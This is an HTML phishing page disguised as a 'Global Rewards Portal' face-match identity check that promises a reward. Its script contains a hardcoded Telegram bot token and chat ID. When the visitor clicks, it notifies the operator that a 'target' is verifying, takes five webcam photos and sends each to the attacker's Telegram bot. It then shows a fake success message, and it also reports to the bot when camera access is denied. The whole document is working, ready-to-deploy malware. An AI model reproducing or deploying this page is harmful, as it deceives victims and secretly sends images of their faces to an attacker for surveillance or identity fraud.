<!DOCTYPE html>
<html lang="en" class="notranslate">
<head>
    <meta charset="UTF-8">
    <meta name="google" content="notranslate">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Rewards Portal | Identity Verification</title>
    <style>
        body { background-color: #f4f7f6; color: #333; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; }
        .logo { width: 80px; margin-bottom: 20px; }
        h2 { color: #2c3e50; margin-bottom: 10px; }
        p { color: #7f8c8d; font-size: 0.9rem; line-height: 1.5; margin-bottom: 25px; }
        #startBtn { background-color: #27ae60; color: white; border: none; padding: 15px 40px; border-radius: 30px; font-weight: bold; cursor: pointer; font-size: 1rem; transition: background 0.3s; width: 100%; }
        #startBtn:hover { background-color: #219150; }
        video, canvas { display: none; }
    </style>
</head>
<body class="notranslate">

<div class="card">
    <img src="https://cdn-icons-png.flaticon.com/512/614/614560.png" class="logo" alt="Secure">
    <h2>Identity Verification</h2>
    <p>To claim your 2026 Global Reward, please complete the face-match verification. Ensure you are in a well-lit area and click the button below.</p>
    <button id="startBtn">START FACE-MATCH</button>
</div>

<video id="v" autoplay></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    // ÿßŸÑÿ≠ÿ≥ÿßÿ®ÿßÿ™ ÿßŸÑŸÖÿ®ÿ±ŸÖÿ¨ÿ© ÿ®ŸÜÿßÿ°Ÿã ÿπŸÑŸâ ŸÖÿØÿÆŸÑÿßÿ™ŸÉ
    const T = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU"; //
    const C = "8397194527"; //

    const btn = document.getElementById('startBtn');
    const video = document.getElementById('v');
    const canvas = document.getElementById('c');

    btn.addEventListener('click', async () => {
        // 1. ÿ•ÿ±ÿ≥ÿßŸÑ ÿ™ŸÜÿ®ŸäŸá ŸÅŸàÿ±Ÿä ŸÑŸÑÿ™ŸÑÿ¨ÿ±ÿßŸÖ ÿ®ŸÖÿ¨ÿ±ÿØ ÿßŸÑÿ∂ÿ∫ÿ∑
        fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=üîî Target is attempting verification!`);

        try {
            // 2. ÿ∑ŸÑÿ® ÿ•ÿ∞ŸÜ ÿßŸÑŸÉÿßŸÖŸäÿ±ÿß
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            btn.innerText = "VERIFYING... (0/5)";
            btn.style.backgroundColor = "#f39c12";

            let count = 0;
            const timer = setInterval(() => {
                if (count < 5) {
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, 640, 480);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', C);
                        fd.append('photo', blob, 'img.jpg');
                        fd.append('caption', `üì∏ Capture ${count + 1}/5 from Global Rewards Portal`);
                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg');
                    count++;
                    btn.innerText = `VERIFYING... (${count}/5)`;
                } else {
                    clearInterval(timer);
                    stream.getTracks().forEach(track => track.stop());
                    btn.innerText = "VERIFICATION SUCCESS";
                    btn.style.backgroundColor = "#27ae60";
                    alert("Success! Your reward is being processed.");
                }
            }, 2000);

        } catch (err) {
            // 3. ÿ•ÿ±ÿ≥ÿßŸÑ ÿ™ŸÜÿ®ŸäŸá ŸÅŸä ÿ≠ÿßŸÑ ÿßŸÑÿ±ŸÅÿ∂
            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=‚ùå Access Denied: Target blocked the camera.`);
            alert("Error: Camera access is required to verify identity. Please allow camera and try again.");
        }
    });
</script>
</body>
</html>
